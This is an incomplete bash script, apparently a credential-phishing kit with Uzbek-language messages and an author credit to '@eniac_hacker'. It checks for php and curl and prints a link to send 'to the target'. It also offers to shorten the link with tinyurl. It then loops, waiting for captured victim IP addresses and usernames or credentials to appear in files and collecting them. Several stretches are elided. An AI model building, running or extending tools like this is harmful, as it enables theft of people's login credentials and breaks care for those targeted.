#!/bin/bash
#eniac hacker tomonidan tarjima qilindi
...
command -v php > /dev/null 2>&1 || { echo >&2 "PHP o'rnatilmagan. Iltimos o'rnating."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Cruel o'rnatilmagan . Iltimos o'rnating."; exit 1; }
...
printf "\e[1;77m ╚══════╝ ╚═════╝  ╚═════╝╚═╝╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ \e[0m\n"
printf "\n"
printf "\e[1;93m       .:.:.\e[0m\e[1;77m Muallif: @eniac_hacker \e[0m\e[1;93m.:.:.\e[0m\n"
printf "\n"
}
...
printf "\e[1;93m[!] Yukalab olinmadi... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi
...
printf "\e[1;93m[!] Yuklab olinmadi... \e[0m\n"
exit 1
fi
fi
fi
...
printf "\e[1;92m[\e[0m*\e[1;92m] Ushbu havolani nishonga yuboring:\e[0m\e[1;77m %s\e[0m\n" $link
...
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Yoki tinyurldan foydalanish:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"
...
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Link ochilishini kuting ...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP topdim!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Hisob maʼlumotlari topildi!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5
